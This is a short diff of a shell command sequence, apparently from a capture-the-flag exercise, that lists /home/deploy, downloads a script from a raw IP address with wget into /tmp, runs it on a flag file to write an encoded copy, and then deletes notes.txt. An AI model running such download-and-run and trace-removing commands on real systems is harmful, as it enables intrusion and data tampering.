@@ -8,7 +8,7 @@ ls -la /home/deploy
 cat /home/deploy/notes.txt
 wget http://179.43.153.2/encode.py -O /tmp/encode.py
 cat /tmp/encode.py
-python3 /tmp/encode.py /home/deploy/flag.txt
+python3 /tmp/encode.py /home/deploy/flag.txt /home/deploy/flag.txt.enc
 ls -la /home/deploy/flag.txt*
 cat /home/deploy/flag.txt.enc
 rm -f /home/deploy/notes.txt
